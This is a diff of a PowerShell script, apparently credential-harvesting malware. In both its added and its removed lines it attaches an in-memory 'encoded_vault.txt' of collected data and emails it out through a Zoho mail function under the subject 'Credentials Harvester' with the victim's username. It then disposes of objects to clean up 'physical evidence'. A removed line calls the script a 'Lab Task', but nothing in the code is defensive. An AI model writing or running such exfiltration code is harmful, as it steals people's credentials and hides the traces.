@@ -152,6 +152,10 @@ if (Test-Path $outputFilePath) {
     $attachment = New-Object Net.Mail.Attachment($ms, "encoded_vault.txt")
 
     # 5. Send Email Logic here...
+    $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
+    $attachments = @($attachment)  # Array of attachment file paths
+    Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+
     
     # 6. Cleanup physical evidence
     $attachment.Dispose()
@@ -163,18 +167,5 @@ if (Test-Path $outputFilePath) {
 
 
 
-# 6. Create the Email Attachment (exists only in RAM)
-$attachment = New-Object Net.Mail.Attachment($ms, "$env:TEMP\data.txt")
 
-# 7. Send Email via TLS
-if (-not $isEmailSent) {
-    # Email parameters
-    $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
-    $attachments = @($attachment)  # Array of attachment file paths
-    Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-}
 
-# 8. Secure Cleanup
-$attachment.Dispose()
-$ms.Dispose()
-Write-Host "Lab Task Complete. Memory Purged." -ForegroundColor Green
